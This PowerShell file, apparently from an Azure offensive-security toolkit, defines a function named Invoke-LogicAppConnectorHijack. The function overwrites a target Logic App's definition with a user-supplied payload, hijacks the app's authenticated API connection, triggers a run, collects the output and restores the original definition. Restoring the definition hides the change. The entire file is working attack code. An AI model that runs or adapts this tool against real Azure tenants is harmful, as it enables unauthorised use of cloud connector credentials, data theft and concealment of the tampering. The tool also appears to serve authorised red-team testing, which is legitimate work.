

#This function will perform the following actions:
#Retrieve the original definition of a Logic App
#Replace that Logic App with a user-specified definition
#Trigger the new Logic App and retrieve any output
#Restore the original Logic App definition
Function Invoke-LogicAppConnectorHijack{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, 
        HelpMessage="Name of the API Connection to hijack. Not necessary if you've hardcoded it into your new definition.")]
        [string]$connectionName = "",

        [Parameter(Mandatory=$true,
        HelpMessage="Logic App to target")]
        [string]$logicAppName = "",

        [Parameter(Mandatory=$true,
        HelpMessage="New definition for the Logic App. Any connection names should be replaced with CONNECTION_PLACEHOLDER")]
        [string]$definitionPath = ""
    )

    #Get the new definition and replace any connection name placeholders. If the connection name is hardcoded then it'll just do nothing
    $newDefinition = ""
    if($definitionPath -ne ""){
        $newDefinition = Get-Content -LiteralPath $definitionPath
    }
    else{
        Write-Error "Failed to get new definition from the provided path"
        break
    }
    $replacedDefinition = $newDefinition.Replace("CONNECTION_PLACEHOLDER", $connectionName)
    #Writing this to a file plays better with the Az module
    $replacedDefinition | Out-File -FilePath ".\new_definition.json"


    $app = Get-AzLogicApp -Name $logicAppName

    $logicAppRG = $app.Id.Split('/')[4]

    #Save the original definition
    $definition = $app.Definition.ToString()

    if($app.Parameters.'$connections'.Value.$connectionName -eq $null){
        Write-Error "Error trying to get values for provided connector, exiting"
        break
    }

    #Get the connection information and get it formatted into a JSON string
    $connection = ($app.Parameters.'$connections'.Value.$connectionName).ToString()
    $connectionString = '
    {
        "$connections": {
            "value": {
                $placeholder 
            }
        }
    }'
    
    $connectionReplacement = "
        $connectionName : $connection
    "

    $connectionString = $connectionString.Replace('$placeholder', $connectionReplacement)
    #Writing it a file plays better with the Az module
    $connectionString | Out-File -FilePath ".\parameters.json"

    Write-Output (-join("Targeting the ", $logicAppName, " logic app..."))

    #Update the Logic App definition
    try{Set-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -State "Enabled" -DefinitionFilePath ".\new_definition.json" -Force -ParameterFilePath ".\parameters.json" -ErrorAction Stop | Out-Null}
    catch{
        Write-Warning "Failed to update Logic App definition, check your payload"
        Remove-Item -Path ".\parameters.json"
        Remove-Item -Path ".\new_definition.json"
        break
    }

    Write-Output ("Overwrote the existing logic app...")
   
    #Remove the temporary files that we created
    Remove-Item -Path ".\parameters.json"
    Remove-Item -Path ".\new_definition.json"
    
    #Our new definition should always have a callback URL
    $callbackInfo = Get-AzLogicAppTriggerCallbackUrl -ResourceGroupName $logicAppRG -Name $logicAppName -TriggerName "manual"
    $endpoint = $callbackInfo.Value
    
    #Call the endpoint to trigger the LA run
    Invoke-WebRequest -Method "POST" -Uri $endpoint | Out-Null
    Write-Output "Called the manual trigger endpoint..."

    try{Set-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -State "Enabled" -Definition $definition -Force -Parameters $app.Parameters -ErrorAction Stop | Out-Null}
    catch{
        Write-Warning "Failed to restore Logic App definition, writing definition to $logicAppName_old_definition.json"
        #This shouldn't happen since the original definition should always be valid, but just to cover any corner cases 
        #If restoring this way fails, then you may also be able to restore it by promoting the version under the Versions tab
        $definition | Out-File -FilePath ".\$logicAppName_old_definition.json"
    }
    Write-Output "Restored the original logic app."

    $history = Get-AzLogicAppRunHistory -ResourceGroupName $logicAppRG -Name $logicAppName
    $mostRecent = $history[0]

    #If the Logic App is still running then we'll need to loop until it finishes
    while($mostRecent.Status -eq "Running"){
        $history = Get-AzLogicAppRunHistory -ResourceGroupName $logicAppRG -Name $logicAppName
        $mostRecent = $history[0]
    }

    if($mostRecent.Outputs -ne $null){
        Write-Output "Output from Logic App run:"
        Write-Output $mostRecent.Outputs.result.Value.ToString()
    }

    if($mostRecent.Error -ne $null){
        Write-Output "Error from Logic App run:"
        Write-Output $mostRecent.Error.message
    }

}



